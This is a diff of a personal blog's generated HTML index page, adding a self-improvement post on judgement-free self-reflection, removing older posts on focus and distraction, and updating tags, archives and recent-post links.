+  <time class="dt-published" datetime="2023-06-10T11:28:18.000Z" itemprop="datePublished">2023-06-10</time>
+</a>
+    
+  </div>
+  <div class="article-inner">
+    
+    
+      <header class="article-header">
+        
+  
+    <h1 itemprop="name">
+      <a class="p-name article-title" href="/2023/06/10/Guilt-Free-Reflection/">Guilt-Free Reflection</a>
+    </h1>
+  
+
+      </header>
+    
+    <div class="e-content article-entry" itemprop="articleBody">
+      
+        <p>To improve anything, it is vital to observe it consistently for periods of time without interference, collect data, make observations and deductions, and finally improve via trial and error. Humans have been doing this since the dawn of civilization and it is our way of understanding and navigating the natural world.</p>
+<p>When we apply this method to the self, we are bound to interfere with our own measurements. We often judge ourselves, impose expectations, and carry the weight of guilt or shame when we perceive that we fall short. This interference can cloud our observations and hinder our ability to make accurate deductions about ourselves. Consistency is impacted too. Bursts of intense self-reflection followed by periods of guilt or shame can create an unhealthy cycle. We may become hesitant to engage in self-reflection altogether, fearing the negative emotions that often accompany it.</p>
+<p>So, how do we break free from this cycle? While completely eliminating negative emotions may be unachievable due to the way our brains function, it is possible to minimize their impact by looking after yourself and taking care of your basic needs before letting your mind slip into deep introspection of your life. Things like sleep, hydration, food, walking outside, a good shower, comfortable wear and some quiet can go a long way.</p>
+<p>Next, the key here is to observe yourself objectively as an outsider, and without judgement or preconceived notions, like observing an external entity or phenomena, just observing and taking notes. For example, imagine you have a cat, and it scratches the furniture. You’d observe it’s behavior and note things like:</p>
+<ul>
+<li>“19&#x2F;09 - Cat scratches sofa when I’m outside the house”</li>
+<li>“21&#x2F;09 - Added cardboard but cat seems uninterested, still scratches sofa”</li>
+<li>“22&#x2F;09 - Moved sofa, cat seems more anxious now”</li>
+</ul>
+<p>Approaching self-improvement with the same mindset of curiousity and problem-solving is not only healthier for you, but more reliable. Doing this requires the ability to observe yourself from a distance. In Buddhism, this is known as <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Nonattachment_(philosophy)">Detachment</a>. Stoicism has it’s own related concept, called <a target="_blank" rel="noopener" href="https://en.wikipedia.org/wiki/Apatheia">Apatheia</a>.</p>
+<p>It is important to be intentful and consistent about self-reflection. You cannot seriously expect to improve if you only do it when it’s New Year’s, or when you feel down. Dedicating a consistent time and place for this activity allows observation of a wider spectrum of our different states, gaining clearer and more complete insights to act upon.</p>
+
+      
+    </div>
+    <footer class="article-footer">
+      <a data-url="https://astral.page/2023/06/10/Guilt-Free-Reflection/" data-id="cljnja7oo0005duosf5qw6e69" data-title="Guilt-Free Reflection" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      
+      
+      
+  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
 
     </footer>
   </div>
@@ -372,7 +662,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/20/Poem-Kiss-the-Stars-Goodbye/" data-id="clipuwbnf000bbjoigi7x1ak6" data-title="Poem: Kiss the Stars Goodbye" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/20/Poem-Kiss-the-Stars-Goodbye/" data-id="cljnja7ou000bduosg6yqem6d" data-title="Poem: Kiss the Stars Goodbye" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -418,7 +708,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/18/The-Importance-of-Preserving-Progress/" data-id="clipuwbnk000ibjoiaslbcjpe" data-title="The Importance of Preserving Progress" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/18/The-Importance-of-Preserving-Progress/" data-id="cljnja7p6000pduos8gco3hae" data-title="The Importance of Preserving Progress" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -463,7 +753,7 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/15/Nature-and-Attention-Restoration/" data-id="clipuwbnc0006bjoi57n4c1zs" data-title="Nature&#39;s Restorative Powers" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/15/Nature-and-Attention-Restoration/" data-id="cljnja7op0006duos65qv05hu" data-title="Nature&#39;s Restorative Powers" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
@@ -512,140 +802,11 @@
       
     </div>
     <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/14/True-Freedom-Requires-Accepting-Death/" data-id="clipuwbnl000nbjoia4lg816q" data-title="True Freedom Requires Accepting Death" class="article-share-link"><span class="fa fa-share">Share</span></a>
+      <a data-url="https://astral.page/2023/05/14/True-Freedom-Requires-Accepting-Death/" data-id="cljnja7p8000uduos2okua8pw" data-title="True Freedom Requires Accepting Death" class="article-share-link"><span class="fa fa-share">Share</span></a>
       
       
       
   <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Priming-the-Mind" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/05/13/Priming-the-Mind/" class="article-date">
-  <time class="dt-published" datetime="2023-05-13T22:24:21.000Z" itemprop="datePublished">2023-05-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/05/13/Priming-the-Mind/">Priming the Mind</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>When not learning or creating, there is a passive way to “prime” your brain. I’ve learned this technique from a <a target="_blank" rel="noopener" href="https://youtu.be/A2sS00egAzg?t=330">video</a> by Elizabeth Filips. She talks in-depth about the challenges of a chaotic mind to improve in a world where consistency is key. The method she describes is interesting: instead of trying to get consistent, linear, “1% every day” progress, go for 5000% progress. The way she approaches it is by “priming” the mind. When you want to learn something, watch videos and tutorials about it, read blog posts, read about previous efforts in the field but <strong>don’t</strong> allow yourself to start actually learning it. Motivation will naturally build up, and at some point your mind won’t be able to stand it anymore - you’ll enter flow state and spend countless hours, staying up nights learning and playing with everything about this subject.</p>
-<p>I know this exposure motivation method works, because I have seen it’s effects on myself in the past. Will doing this by intention lead to different results? Maybe the mind will be able to distinguish and rebel when it recognizes that it is being led or manipulated to be excited about a particular subject? I wonder.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/13/Priming-the-Mind/" data-id="clipuwbnh000ebjoi8d1b1j3q" data-title="Priming the Mind" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/focus/" rel="tag">focus</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-The-Immense-Joy-of-Deep-Work" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/05/13/The-Immense-Joy-of-Deep-Work/" class="article-date">
-  <time class="dt-published" datetime="2023-05-13T15:56:04.000Z" itemprop="datePublished">2023-05-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/05/13/The-Immense-Joy-of-Deep-Work/">The Immense Joy of Deep Work</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>The amount of rush I get when I am already in flow and coding is unreal. In this alternate realm, the ego is dissolved, there is no concept of effort and anything is possible. The mind is <a target="_blank" rel="noopener" href="https://www.youtube.com/watch?v=J8DkZqQ8yHQ">flying</a> in 3000mph, completely free from anything that ever held it back. It doesn’t take too much time to get there, either. I just need to get over the 10 minutes of “getting bored” and recalibrate the “focus lenses” of my mind to zoom in on the thing I want.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/13/The-Immense-Joy-of-Deep-Work/" data-id="clipuwbnj000hbjoi8kk793rh" data-title="The Immense Joy of Deep Work" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/focus/" rel="tag">focus</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
-
-    </footer>
-  </div>
-  
-</article>
-
-
-
-  
-    <article id="post-Ghosts-of-Distraction" class="h-entry article article-type-post" itemprop="blogPost" itemscope itemtype="https://schema.org/BlogPosting">
-  <div class="article-meta">
-    <a href="/2023/05/13/Ghosts-of-Distraction/" class="article-date">
-  <time class="dt-published" datetime="2023-05-13T07:20:28.000Z" itemprop="datePublished">2023-05-13</time>
-</a>
-    
-  </div>
-  <div class="article-inner">
-    
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="p-name article-title" href="/2023/05/13/Ghosts-of-Distraction/">Ghosts of Distraction</a>
-    </h1>
-  
-
-      </header>
-    
-    <div class="e-content article-entry" itemprop="articleBody">
-      
-        <p>You know the feeling where there is an annoying noise in the background? Your mind readjusts to it’s new reality and accepts it as the new norm: Reality + “Beeeeeep”…</p>
-<p>You’re still able to concentrate because the human brain is among the most remarkable devices to ever exist, but there is a thread running in the back of your mind, noticing the noise, processing it, and it’s taking up CPU and driving you crazy. It’s hard to even notice that it’s doing that, until the noise is gone and you relax in a sigh of relief.</p>
-<p>When the noise comes back for the second time around, your mind loses faith in the idea that the environment is safe from noise, and readjusts again. As the noise keeps coming back again and again, it becomes a permanent resident in the mind’s model of the environment. Even when it disappears, you ask yourself, “Is it still there? When will it be back? Should I concentrate fully or expect the noise to come back?”. Apart from it being a nasty form of torture and taking up permanent CPU, it degrades the quality of your focus and your ability to consume informations and solve problems. You forget how it was before, and it seems like it was always like this.</p>
-<p>Even when it’s not there for days, you still wait for it in anticipation, knowing it will come back to disturb you. Just like when it first introduced itself, when the noise disappears, it takes time for the mind to unlearn the trauma and gain trust in the environment as being safe from noise again. During that time, the mind had already allocated cognitive resources, using them to <a target="_blank" rel="noopener" href="https://www.choosingtherapy.com/anticipatory-anxiety/">anticipate</a> and expect something that will break the stream of focus. So, even when the disturbance is not physically present anymore, it’s there - like a ghosting effect.</p>
-<p>This phenomena happens with other types of distractions. It could be a noisy roommate or neighbor, unimportant phone call, even that other task you keep thinking about and getting back to. We basically train our mind to acknowledge that our time working is worth as much as the time spent doing the interrupting activity. Because, after all, if what we were doing was really <strong>that</strong> important, couldn’t everything else wait? This thought corrupts our mindset and stops us from letting go of outside reality and entering a state of deep work.</p>
-<p>I don’t have all the answers, but for me, the way to deal with this is: instead of dealing with, or, removing the distractions, I remove myself from the distractions. Like starting with a blank sheet of paper, a separate, clean physical and virtual environment helps me completely focus and immerse myself in the process of creation.</p>
-
-      
-    </div>
-    <footer class="article-footer">
-      <a data-url="https://astral.page/2023/05/13/Ghosts-of-Distraction/" data-id="clipuwbna0004bjoi2e2y2ict" data-title="Ghosts of Distraction" class="article-share-link"><span class="fa fa-share">Share</span></a>
-      
-      
-      
-  <ul class="article-tag-list" itemprop="keywords"><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/focus/" rel="tag">focus</a></li><li class="article-tag-list-item"><a class="article-tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li></ul>
 
     </footer>
   </div>
@@ -673,7 +834,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tags</h3>
     <div class="widget">
-      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/documentation/" rel="tag">documentation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/focus/" rel="tag">focus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/food/" rel="tag">food</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gems-off-the-internet/" rel="tag">gems-off-the-internet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/poetry/" rel="tag">poetry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
+      <ul class="tag-list" itemprop="keywords"><li class="tag-list-item"><a class="tag-list-link" href="/tags/documentation/" rel="tag">documentation</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/focus/" rel="tag">focus</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/food/" rel="tag">food</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/gems-off-the-internet/" rel="tag">gems-off-the-internet</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/hacking/" rel="tag">hacking</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/internals/" rel="tag">internals</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/linux/" rel="tag">linux</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/poetry/" rel="tag">poetry</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/python/" rel="tag">python</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/self-improvement/" rel="tag">self-improvement</a></li><li class="tag-list-item"><a class="tag-list-link" href="/tags/tech/" rel="tag">tech</a></li></ul>
     </div>
   </div>
 
@@ -683,7 +844,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Tag Cloud</h3>
     <div class="widget tagcloud">
-      <a href="/tags/documentation/" style="font-size: 10px;">documentation</a> <a href="/tags/focus/" style="font-size: 15px;">focus</a> <a href="/tags/food/" style="font-size: 10px;">food</a> <a href="/tags/gems-off-the-internet/" style="font-size: 10px;">gems-off-the-internet</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/poetry/" style="font-size: 10px;">poetry</a> <a href="/tags/self-improvement/" style="font-size: 20px;">self-improvement</a> <a href="/tags/tech/" style="font-size: 10px;">tech</a>
+      <a href="/tags/documentation/" style="font-size: 10px;">documentation</a> <a href="/tags/focus/" style="font-size: 17.5px;">focus</a> <a href="/tags/food/" style="font-size: 10px;">food</a> <a href="/tags/gems-off-the-internet/" style="font-size: 10px;">gems-off-the-internet</a> <a href="/tags/hacking/" style="font-size: 12.5px;">hacking</a> <a href="/tags/internals/" style="font-size: 12.5px;">internals</a> <a href="/tags/linux/" style="font-size: 10px;">linux</a> <a href="/tags/poetry/" style="font-size: 10px;">poetry</a> <a href="/tags/python/" style="font-size: 12.5px;">python</a> <a href="/tags/self-improvement/" style="font-size: 20px;">self-improvement</a> <a href="/tags/tech/" style="font-size: 15px;">tech</a>
     </div>
   </div>
 
@@ -692,7 +853,7 @@
   <div class="widget-wrap">
     <h3 class="widget-title">Archives</h3>
     <div class="widget">
-      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li></ul>
+      <ul class="archive-list"><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/07/">July 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/06/">June 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/05/">May 2023</a></li><li class="archive-list-item"><a class="archive-list-link" href="/archives/2023/04/">April 2023</a></li></ul>
     </div>
   </div>
 
@@ -705,23 +866,23 @@
       <ul>
         
           <li>
-            <a href="/2023/06/10/Guilt-Free-Reflection/">Guilt-Free Reflection</a>
+            <a href="/2023/07/04/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-III/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part III)</a>
           </li>
         
           <li>
-            <a href="/2023/06/10/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/">An Exercise in Self Love: What Would You Wish for Yourself?</a>
+            <a href="/2023/07/04/An-Exercise-in-Self-Love-What-Would-You-Wish-for-Yourself/">An Exercise in Self Love: What Would You Wish for Yourself?</a>
           </li>
         
           <li>
-            <a href="/2023/06/10/NixOS-is-so-Cool/">NixOS is so Cool!</a>
+            <a href="/2023/07/04/NixOS-is-so-Cool/">NixOS is so Cool!</a>
           </li>
         
           <li>
-            <a href="/2023/05/20/Poem-Kiss-the-Stars-Goodbye/">Poem: Kiss the Stars Goodbye</a>
+            <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-II/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part II)</a>
           </li>
         
           <li>
-            <a href="/2023/05/18/The-Importance-of-Preserving-Progress/">The Importance of Preserving Progress</a>
+            <a href="/2023/07/03/Sneaky-Snek-Messing-with-Python-s-Internal-Functions-Part-I/">Sneaky Snek: Messing with Python&#39;s Internal Functions (Part I)</a>
           </li>
         
       </ul>
